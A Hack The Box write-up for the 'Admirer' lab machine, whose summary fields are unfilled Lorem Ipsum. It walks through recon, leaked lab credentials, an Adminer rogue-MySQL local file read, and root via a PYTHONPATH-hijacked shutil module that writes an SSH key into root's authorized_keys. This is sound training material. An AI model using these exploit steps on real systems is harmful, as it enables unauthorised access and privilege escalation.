---
layout: single
title: Admirer - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-05-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-admirer/admirer_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-admirer/admirer_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. root@nidus:~# nmap -Pn -sC -sV -n admirer.htb
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
    | ssh-hostkey:
    |   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
    |   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
    |_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    | http-robots.txt: 1 disallowed entry
    |_/admin-dir
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Admirer
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB:
    + http://10.10.10.187/index.php (CODE:200|SIZE:6051)
    + http://10.10.10.187/robots.txt (CODE:200|SIZE:138)

    NIKTO:
    + "robots.txt" contains 1 entry which should be manually viewed.


2. robots.txt contains "Disallow: /admin-dir". Fuzzing the directory we find nothing, however adding searching for .txt-files
   we do find contacts.txt and credentials.txt.

   root@nidus:/opt# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/admin-dir/FUZZ.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
    ________________________________________________

     :: Method           : GET
     :: URL              : http://10.10.10.187/admin-dir/FUZZ.txt
     :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403
    ________________________________________________

    contacts                [Status: 200, Size: 350, Words: 19, Lines: 30]
    credentials             [Status: 200, Size: 136, Words: 5, Lines: 12]


3. Curl the pages:

    root@nidus:~# curl http://admirer.htb/admin-dir/contacts.txt
    ##########
    # admins #
    ##########
    # Penny
    Email: p.wise@admirer.htb


    ##############
    # developers #
    ##############
    # Rajesh
    Email: r.nayyar@admirer.htb

    # Amy
    Email: a.bialik@admirer.htb

    # Leonard
    Email: l.galecki@admirer.htb



    #############
    # designers #
    #############
    # Howard
    Email: h.helberg@admirer.htb

    # Bernadette
    Email: b.rauch@admirer.htb

    root@nidus:~# curl http://admirer.htb/admin-dir/credentials.txt
    [Internal mail account]
    w.cooper@admirer.htb
    fgJr6q#S\W:$P

    [FTP account]
    ftpuser
    %n?4Wz}R$tTF7

    [Wordpress account]
    admin
    w0rdpr3ss01!


4. Using the FTP credentials we can extract to files, html.tar.gz and dump.sql. Extracting we find even more useful info:

   root@nidus:/opt/htb/machines/admirer/ftp/html# cat index.php
    ..
     $username = "waldo";
     $password = "]F7jLHw:*G>UPrTo}~A"d6b";
     $dbname = "admirerdb";

   root@nidus:/opt/htb/machines/admirer/ftp/html/utility-scripts# cat db_admin.php
     ..
       $servername = "localhost";
       $username = "waldo";
       $password = "Wh3r3_1s_w4ld0?";

   root@nidus:/opt/htb/machines/admirer/ftp# cat dump.sql
      -- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)


  Trying to brute force SSH with found credentials gives nothing. Continue to enumerate.


5. Fuzzing the utility-scripts directory we find a login page, adminer.php.

    root@nidus:/opt# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.187/utility-scripts/FUZZ.php

            /'___\  /'___\           /'___\
           /\ \__/ /\ \__/  __  __  /\ \__/
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
             \ \_\   \ \_\  \ \____/  \ \_\
              \/_/    \/_/   \/___/    \/_/

           v1.1.0-git
        ________________________________________________

         :: Method           : GET
         :: URL              : http://10.10.10.187/utility-scripts/FUZZ.php
         :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
         :: Follow redirects : false
         :: Calibration      : false
         :: Timeout          : 10
         :: Threads          : 40
         :: Matcher          : Response status: 200,204,301,302,307,401,403
        ________________________________________________

        .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
        .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
        adminer                 [Status: 200, Size: 4156, Words: 189, Lines: 52]
        info                    [Status: 200, Size: 83813, Words: 4024, Lines: 962]
        phptest                 [Status: 200, Size: 32, Words: 8, Lines: 1]


6. Adminer is a database front-end, and the current running version is 4.6.2. We are unable to login with found credentials.
   Googling about that version we find that it has a vulnerability that allows us to get the server to connect back to us, and
   extract local credentials.

   Start by setting up our local SQL Server.

   root@nidus:/opt# vi /etc/mysql/mariadb.conf.d/50-server.cnf
    ..
    #port                   = 3306
    ..
    #bind-address            =  127.0.0.1

   root@nidus:/opt# service mysql restart
   root@nidus:/opt# mysql -u root
     MariaDB [(none)]> CREATE USER 'p3'@admirer.htb IDENTIFIED BY 'test123';
     MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'p3'@admirer.htb IDENTIFIED BY 'test123';
     MariaDB [(none)]> FLUSH PRIVILEGES;
     MariaDB [(none)]> create database giveUser;

   Double check that your service is up and running.
   root@nidus:/opt# nmap 10.10.14.5 -p 3306
    PORT     STATE SERVICE
    3306/tcp open  mysql

   Connect back to your local server from the login promt.
   System: MySQL
   Server: 10.10.14.5
   Username: p3
   Password: test123
   Database: giveUser


7. Once logged in in the top left corner press 'SQL Command' and use local file read exploit to find the new and updated creds in
   index.php.

    load data local infile '/var/www/html/index.php'
    into table giveUser.ext
    fields terminated by "\n"

  Press 'select' next to the table ext and scroll down to find new creds.
    ..
    edit	                        $servername = "localhost";
    edit	                        $username = "waldo";
    edit	                        $password = "&<h5b~yK3F#{PaPB&dA}{H>";
    edit	                        $dbname = "admirerdb";


8. SSH with new found credentials and grab user.txt
    waldo@admirer:~$ cat user.txt
      07ef49887c197759a2815e192ff97638



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. sudo -l tells us that we can change the environment variables (setenv) and run /opt/scripts/admin_tasks.sh as root. In the directory
   /opt/scripts we find 2 scripts 'admin_tasks.sh' and 'backup.py'. The backup-script calls for function 'make_archive' in module 'shutil',
   which is triggered from admin_tasks.sh 'Backup Web Data'-function (option 6).

   waldo@admirer:/tmp/p3$ sudo -l
     ..
     User waldo may run the following commands on admirer:
         (ALL) SETENV: /opt/scripts/admin_tasks.sh

    waldo@admirer:/opt/scripts$ cat admin_tasks.sh
      #!/bin/bash
      ..
         backup_web()
      {
          if [ "$EUID" -eq 0 ]
          then
              echo "Running backup script in the background, it might take a while..."
              /opt/scripts/backup.py &
          else
              echo "Insufficient privileges to perform the selected operation."
          fi
      }


    waldo@admirer:/opt/scripts$ cat backup.py
      #!/usr/bin/python3

      from shutil import make_archive

      src = '/var/www/html/'

      # old ftp directory, not used anymore
      #dst = '/srv/ftp/html'

      dst = '/var/backups/html'

      make_archive(dst, 'gztar', src)



2. By default, python will ALLWAYS execute external modules first from winthin the directory of the script (/opt/scripts) and
   then follow PYTHONPATH. Unfortunatley we are not allowed to write files into /opt/scripts, so next we check if we can
   hijack the module in any of the PATH-directories.

   Locate shutil.py:
     waldo@admirer:/opt/scripts$ find / -name shutil.py 2>&1 | grep -v "Permission denied"
      /usr/lib/python3.5/shutil.py
      /usr/lib/python2.7/shutil.py

   Check PYTHONPATH:
     waldo@admirer:/opt/scripts$ python3 -c 'import sys; print (sys.path)'
      ['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']

    Looking in the box we can confirm that neither is /usr/lib writeable. We are unable to hijack the module by inserting a
    malicious script before the original.

  However, looking at the output from 'sudo -l' we are allowed to "SETENV", meaning we can change and honor PATH's.

3. Create a malicious file you'd like the script to trigger. Start by a simple one and then move on to a more complex to
   grant a shell.

   Write to a file:
   waldo@admirer:/dev/shm$ cat shutil.py
     import os
     os.system("echo 'test' >> /dev/shm/test.txt")


   Run the script with your environment PATH (where your malicious script is).
   waldo@admirer:/opt/scripts$ sudo PYTHONPATH="/dev/shm" ./admin_tasks.sh
    ..
    Choose an option: 6
    Running backup script in the background, it might take a while...

  waldo@admirer:/dev/shm$ ls -al
    total 8
    drwxrwxrwt  2 root  root  100 May 15 12:11 .
    drwxr-xr-x 17 root  root  560 May 15 12:11 ..
    -rw-r--r--  1 waldo waldo 671 May 15 12:11 shutil.py
    -rw-r--r--  1 root  root    5 May 15 12:06 test.txt
    -rw-r--r--  1 root  root    0 May 15 10:21 .tmpfs


  test.txt was created by root. We can now make it more complex and insert our public key into root's authorized_keys.

   waldo@admirer:/dev/shm$ cat shutil.py
import os
def make_archive(a,b,c):
    os.system("mkdir /root/.ssh;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvjlE9AC+5OMV006RAncmH9w/Jr0DYYdxnneDLtTof+DV1qghPPhkjDYyD4Noj3O9W/aD6ZziBa2O9ONnCNBFPTBULr+Uyy2bBLY4xLDb3meIQdplTHGBUus75JZY4MDBRQD5fLPV4xsw/DNAiXGO1DjG3fk6iTV5GgTrhhmH79Lr2XCTWU2Z48EJrIFVJiM+UAyl3qg+nRQ7btAypgzsGyI9MC2zsAnr77Q8lqM0VGkH97PLGo7ljvD4Fy96U8PaIT/sle0Nai/muH8+NetD1RQK5caBJf3zYTs6L1NEacF5c7N9xCDwMsC0ot5z0EIe3jF0So+a8ulCgjgEXl1wVyCaciyqyFzSfVdGeh4m7evluYUAhxQOJR4XoK385+b5G9bYoXOuGhkCPI8s+nHIgjVFU+g5P/vgpt0VEZKVfIG/2J7Ykk9jniBIyZEzVpUPyuOEHexgILs7l7c5uNUQaKalJAA4GK7X+Dyd9WWrLvuIJIwf55Z47uItIJVS7aT8= root@nidus' >> /root/.ssh/authorized_keys")


4. Login as root and grab root.txt

    root@nidus:/opt/htb/machines/admirer# ssh root@admirer.htb -i root-id_rsa
      root@admirer:~# cat root.txt
        57abe1909d2a490f3aa0daa4c8c0833d



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Adminer Vuln
  https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f
  https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool

MariaDB
  https://mariadb.com/kb/en/configuring-mariadb-for-remote-client-access/
  https://mariadb.com/kb/en/select-into-outfile/

Python Shutil
  https://vuldb.com/?id.124167
  https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-1000802

Python sys.path
  https://askubuntu.com/questions/470982/how-to-add-a-python-module-to-syspath

Python Session Hijacking
  https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
  https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
